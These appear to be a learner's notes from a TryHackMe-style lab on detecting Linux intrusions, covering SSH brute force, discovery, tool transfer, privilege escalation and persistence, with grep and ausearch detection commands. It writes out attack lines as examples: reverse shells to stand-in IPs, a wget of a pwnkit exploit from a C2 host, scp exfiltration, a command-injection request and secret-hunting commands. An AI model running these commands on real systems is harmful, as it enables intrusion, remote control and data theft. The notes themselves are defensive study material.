# Linux threat detection

The most common initial access to Linux machines is exposed SSH

SSH is powerful and often poorly defended

Threat actors can access via stolen key or password

--------

### SSH breach

If an IT administator enbles public access to the SSH server, allows password authentication and sets a weak password, the system will be vulnerable to brute force breaches

Indicators : 

- Multiple failed logins and a successful one

- Logins from external IPs

- Logins by password

Commands to detect a brute force attempt : 

root@thm-vm:/var/log$ grep -E 'sshd.*Accepted' auth.log

root@thm-vm:/var/log$ grep -E 'sshd.*Failed' auth.log

-----------

### Services

Linux hosts many applications and services that can be compromised

Web servers have access.log, there it's possible to detect command injection

Example :  10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...]

To detect service breaches the process tree is useful, if we go back process ID's using --pid we can find the origin of the command

<img width="938" height="818" alt="image" src="https://github.com/user-attachments/assets/568493c6-b314-40ba-afc4-ba3e99862c1c" />

In this screenshot I used the parent ID of the suspicious whoami command to move up the process tree

------------

### Discovery

An attacker after gaining initial access will want to learn more about the environment they're in, to know how to operate

Common discovery commands :

- OS and filesystem discovery = pwd, ls /, env, uname -a, hostname

- User and group discovery = id, whoami, w, last, cat /etc/sudoers

- Process and network discovery = ps aux, top, ip a, ip r, arp -a, ss -tnlp

- Cloud or sandbox discovery = systemd-detect-virt, lsmod, uptime

  Especially whoami, because legitimate users will know who they are

Threat actors will also specialize their discovery with commands to look for passwords, CPU GPU information, secrets

Example : history | grep pass, find / -name .env, cat /proc/cpuinfo, lscpu | grep Model
  
<img width="935" height="380" alt="image" src="https://github.com/user-attachments/assets/97b10531-79bd-4a2b-ac7f-02f4ba0278c1" />

In this screenshot I moved up the process tree to find the path of the script that initiated the hostname command

----------

### Motivation for attacks

Hack and forget : large scale, quick gains, intall cryptominer, enroll to botnet, use as proxy

Ingress tool transfer : wget to download a file from a website, curl to make requests to a webpage, scp to transfer the file

<img width="934" height="699" alt="image" src="https://github.com/user-attachments/assets/b8ad75c2-2709-417f-a3b2-5df422cb0edf" />

in this screenshot I looked for installations with wget and curl to see which one was likely to be malicious, in the wget request it was under HTTPS so it doesn't look bad, in the curl request it was helper.sh which looks suspicious and fabricated

----------

### Dota3

Malware that affects a lot of machines

the botnet with more than 2000 IPs scans the internet for open SSH

---------------

### Reverse shell

It's a session from the victim to the attacker, more convenient action to continue the attack

Common commands : 

bash -i >& /dev/tcp/10.10.10.10/1337 0>&1    \  it forces the victim to connect to 10.10.10.10:1337 and launch bash

socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane \ socat alternative

python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")' \ python alternative

Detecting reverse shells : 

 ausearch -i -x socat \ looks for suspicious commands, afterwaards move up the process tree to find the origin

-----------

### Priviledge escalation

 An attacker after breaching the machine won't usually have enough priviledge  to perform his intended actions, that's why he'll attempt priviledge escalation

 Common techniques : 

- Find old versions of Ubuntu = uname -a

- Detecting SUID flag to get root access with the SUID vulnerability = find /bin -perm 4000

- Expose unprotected bakup keys =  ls /etc/ssh

 Indicators of compromise : 

 - Spike of discovery commands

 - Download to temp directory of pwnkit exploit = wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c \ chmod +x /tmp/pwnkit

 - Data exfil with scp = scp dump.tar.gz attacker@c2-server.thm:~

   Detecting activity :  ausearch -i -x pwnkit

----------

### Persistence

Some threat actors will extablish backdoors to keep presistence on  the machine

Cron : runs a process on schedule for persistence

Detection : ausearch -i -f /etc/systemd \ looks or file changes inside the directory

 ausearch -i -x crontab \ looks for execution of crontabs

 --------------

 











